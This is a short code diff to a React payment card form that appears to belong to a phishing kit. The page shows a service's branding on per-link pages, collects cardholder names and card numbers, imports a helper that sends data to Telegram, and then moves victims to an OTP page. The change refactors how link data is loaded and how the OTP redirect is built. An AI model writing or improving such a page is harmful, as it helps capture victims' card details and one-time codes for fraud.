@@ -6,7 +6,7 @@ import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
-import { useLink } from "@/hooks/useLocalStorage";
+import { useLinkData, useLinkNavigation } from "@/hooks/useUrlBasedData";
 import { Shield, CreditCard, AlertCircle, ArrowLeft } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
@@ -15,7 +15,8 @@ const PaymentCardForm = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData } = useLink(id);
+  const { linkData } = useLinkData();
+  const { navigateToOtp } = useLinkNavigation();
   
   const [cardName, setCardName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
@@ -117,7 +118,9 @@ const PaymentCardForm = () => {
     });
     
     // Navigate to OTP
-    navigate(`/pay/${id}/otp`);
+    if (linkData) {
+      navigate(navigateToOtp(id!, linkData));
+    }
   };
   
   return (
